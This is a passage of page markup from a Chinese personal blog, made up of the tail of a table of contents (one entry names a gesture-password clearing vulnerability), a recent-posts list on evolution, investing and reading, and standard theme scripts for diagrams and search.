手势密码清除漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">8.</span> <span class="toc-text">参考资料</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/cn/know_Evolution/" title="如何理解演化论的思想">如何理解演化论的思想</a><time datetime="2025-11-20T16:00:00.000Z" title="发表于 2025-11-21 00:00:00">2025-11-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/cn/investment_expectation/" title="金融投资中的预期思维">金融投资中的预期思维</a><time datetime="2025-11-19T16:00:00.000Z" title="发表于 2025-11-20 00:00:00">2025-11-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/cn/duanyongping/" title="段永平退休20多年后罕见公开访谈">段永平退休20多年后罕见公开访谈</a><time datetime="2025-11-11T16:00:00.000Z" title="发表于 2025-11-12 00:00:00">2025-11-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/cn/how_to_tell_a_story/" title="如何讲好一个故事">如何讲好一个故事</a><time datetime="2025-11-11T16:00:00.000Z" title="发表于 2025-11-12 00:00:00">2025-11-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/cn/naval_reading/" title="纳瓦尔的阅读方法">纳瓦尔的阅读方法</a><time datetime="2025-10-28T16:00:00.000Z" title="发表于 2025-10-29 00:00:00">2025-10-29</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(https://images.unsplash.com/photo-1646026371686-79950ceb6daa?w=640);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 By henices</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.2"></script><script src="/js/main.js?v=5.5.2"></script><script src="/js/tw_cn.js?v=5.5.2"></script><div class="js-pjax"><script>(() => {
  const runMermaid = ele => {
    window.loadMermaid = true
    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'

    ele.forEach((item, index) => {
      const mermaidSrc = item.firstElementChild
      const config = mermaidSrc.dataset.config ? JSON.parse(mermaidSrc.dataset.config) : {}
      if (!config.theme) {
        config.theme = theme
      }
      const mermaidThemeConfig = `%%{init: ${JSON.stringify(config)}}%%\n`
      const mermaidID = `mermaid-${index}`
      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent

      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
      const renderMermaid = svg => {
        mermaidSrc.insertAdjacentHTML('afterend', svg)
      }

      // mermaid v9 and v10 compatibility
      typeof renderFn === 'string' ? renderMermaid(renderFn) : renderFn.then(({ svg }) => renderMermaid(svg))
    })
  }

  const codeToMermaid = () => {
    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
    if (codeMermaidEle.length === 0) return

    codeMermaidEle.forEach(ele => {
      const preEle = document.createElement('pre')
      preEle.className = 'mermaid-src'
      preEle.hidden = true
      preEle.textContent = ele.textContent
      const newEle = document.createElement('div')
      newEle.className = 'mermaid-wrap'
      newEle.appendChild(preEle)
      ele.parentNode.replaceWith(newEle)
    })
  }

  const loadMermaid = () => {
    if (false) codeToMermaid()
    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
    if ($mermaid.length === 0) return

    const runMermaidFn = () => runMermaid($mermaid)
    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid@11.12.1/dist/mermaid.min.js').then(runMermaidFn)
  }

  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
})()</script></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.2"></script></div></div></body></html>